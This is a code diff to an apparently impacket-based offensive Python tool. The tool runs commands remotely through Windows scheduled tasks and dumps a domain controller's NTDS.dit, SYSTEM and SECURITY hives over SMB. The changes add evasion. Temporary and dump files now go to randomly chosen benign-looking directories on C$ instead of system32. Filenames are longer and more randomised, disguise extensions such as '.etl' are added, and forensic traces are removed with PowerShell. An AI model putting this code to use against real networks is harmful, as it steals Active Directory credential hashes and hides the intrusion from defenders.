@@ -11,7 +11,6 @@ import time
 import ntpath
 
 from datetime import datetime, timedelta
-
 from impacket.examples import logger
 from impacket.smbconnection import SMBConnection
 from impacket.dcerpc.v5 import tsch, transport
@@ -204,16 +203,29 @@ class TSCH_EXEC:
         dce.connect()
         dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
         dce.bind(tsch.MSRPC_UUID_TSCHS)
-        tmpName = ''.join([random.choice(string.ascii_letters+string.digits) for _ in range(random.randint(10, 25))])
-        extensions = ['.log', '.txt', '.bak', '.xml', '.dmp', '.dtd', '.sys']
+        tmpName = ''.join([random.choice(string.ascii_letters+string.digits) for _ in range(random.randint(10, 50))])
+        extensions = ['.log', '.txt', '.bak', '.xml', '.dmp', '.dtd', '.sys', '.etl']
         tmpFileName = tmpName + random.choice(extensions)
         random_date_str = random_datetime()
+    
+        dump_directories_task = [
+            {"reg_path": f"%%programdata%%\\Microsoft\\Windows\\Caches\\{tmpFileName}",
+             "share_path": f"ProgramData\\Microsoft\\Windows\\Caches\\{tmpFileName}"
+            },
+            {"reg_path": f"%%Program Files%%\\Common Files\\{tmpFileName}",
+             "share_path": f"Program Files\\Common Files\\{tmpFileName}"
+            },
+            {"reg_path": f"%%windir%%\\Logs\\CBS\\{tmpFileName}",
+             "share_path": f"Windows\\Logs\\CBS\\{tmpFileName}"
+            }
+        ]
+        rdd_task = random.choice(dump_directories_task)
 
         if self.sessionId is not None:
             cmd, args = cmd_split(self.__command)
         else:
             cmd = "cmd.exe"
-            args = "/C %s > %%windir%%\\system32\\%s 2>&1" % (self.__command, tmpFileName)
+            args = f"/C %s > {rdd_task['reg_path']} 2>&1" % (self.__command)
 
         xml = f"""<?xml version="1.0" encoding="UTF-16"?>
 <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
@@ -306,8 +318,8 @@ class TSCH_EXEC:
         waitOnce = True
         while True:
             try:
-                logging.debug('Attempting to read ADMIN$\\system32\\%s' % tmpFileName)
-                smbConnection.getFile('ADMIN$', 'system32\\%s' % tmpFileName, output_callback)
+                logging.debug(f"Attempting to read C$\\{rdd_task['share_path']}")
+                smbConnection.getFile('C$', rdd_task["share_path"], output_callback)
                 break
             except Exception as e:
                 if str(e).find('SHARING') > 0:
@@ -321,8 +333,8 @@ class TSCH_EXEC:
                         raise
                 else:
                     raise
-        logging.debug('Deleting file ADMIN$\\system32\\%s' % tmpFileName)
-        smbConnection.deleteFile('ADMIN$', 'system32\\%s' % tmpFileName)
+        logging.debug(f"Deleting file C$\\{rdd_task['share_path']}")
+        smbConnection.deleteFile('C$', rdd_task["share_path"])
 
         dce.disconnect()
 
@@ -378,13 +390,21 @@ class Ntdsutil:
         self.smb_session = None
         self._is_admin = None
 
-        self.share = "ADMIN$"
-        self.tmp_dir = "C:\\Windows\\system32\\"
-        self.tmp_share = self.tmp_dir.split("C:\\Windows\\")[1]
-        self.dump_location = ''.join([random.choice(string.ascii_letters+string.digits) for _ in range(random.randint(10, 25))])
-        commandFileName = ''.join([random.choice(string.ascii_letters+string.digits) for _ in range(random.randint(10, 25))])
-        commandFileExtension = ['.log', '.txt', '.bak', '.xml', '.dmp', '.dtd', '.sys']
-        self.command_file = "C:\\Windows\\system32\\" + commandFileName + random.choice(commandFileExtension)
+        dump_directories_ntds = [
+            "C:\\ProgramData\\Microsoft\\Windows\\Caches\\",
+            "C:\\Program Files\\Common Files\\",
+            "C:\\Windows\\Logs\\CBS\\"
+        ]
+        
+        rdd_ntds = random.choice(dump_directories_ntds)
+
+        self.share = "C$"
+        self.tmp_dir = rdd_ntds
+        self.tmp_share = rdd_ntds.split("C:\\")[1]
+        self.dump_location = ''.join([random.choice(string.ascii_letters+string.digits) for _ in range(random.randint(10, 50))])
+        commandFileName = ''.join([random.choice(string.ascii_letters+string.digits) for _ in range(random.randint(10, 50))])
+        commandFileExtension = ['.log', '.txt', '.bak', '.xml', '.dmp', '.dtd', '.sys', '.etl']
+        self.command_file = rdd_ntds + commandFileName + random.choice(commandFileExtension)
         current_date = datetime.now()
         formatted_date = current_date.strftime('%Y-%m-%d_%T')
         self.dir_result = f"dump_{formatted_date}_pyntdsutil"
@@ -434,7 +454,6 @@ class Ntdsutil:
             if not os.path.isdir(self.dir_result):
                 os.makedirs(self.dir_result, exist_ok=True)
 
-            # check if ntds.dit is dumped
             dumped = False
             directories = self.smb_session.listPath(shareName=self.share, path=ntpath.normpath(self.tmp_share + self.dump_location + '\\Active Directory\\ntds.dit'))
             for d in directories:
@@ -445,7 +464,6 @@ class Ntdsutil:
             else:
                 logging.error("NTDS.dit not dumped. Exiting...")
                 sys.exit(1)
-
 
             logging.info("Downloading NTDS.dit, SYSTEM, and SECURITY")
             logging.debug('Copy NTDS.dit to host')
@@ -471,7 +489,7 @@ class Ntdsutil:
                     logging.debug('Copied SECURITY file')
                 except Exception as e:
                     logging.error('Error while getting SECURITY file: {}'.format(e))
-            logging.info("Output NTDS dump files to %s" % self.dir_result)
+            logging.info("Output files to %s" % self.dir_result)
             try:
                 command = ["powershell.exe -nop Remove-Item '%s', '%s%s' -Recurse -Force" % (self.command_file, self.tmp_dir, self.dump_location)]
                 atsvc_exec = TSCH_EXEC(self.target.username, self.target.password, self.target.domain, self.target.ntlmhash, self.target.aesKey, self.target.do_kerberos, options.dc_ip,
@@ -484,9 +502,7 @@ class Ntdsutil:
                 logging.error('Error deleting {} directory on share {}: {}'.format(self.dump_location, self.share, e))
         else:
             logging.info("Not an admin. Exiting...")
-
-            
-
+    
     @property
     def is_admin(self) -> bool:
         if self._is_admin is not None:
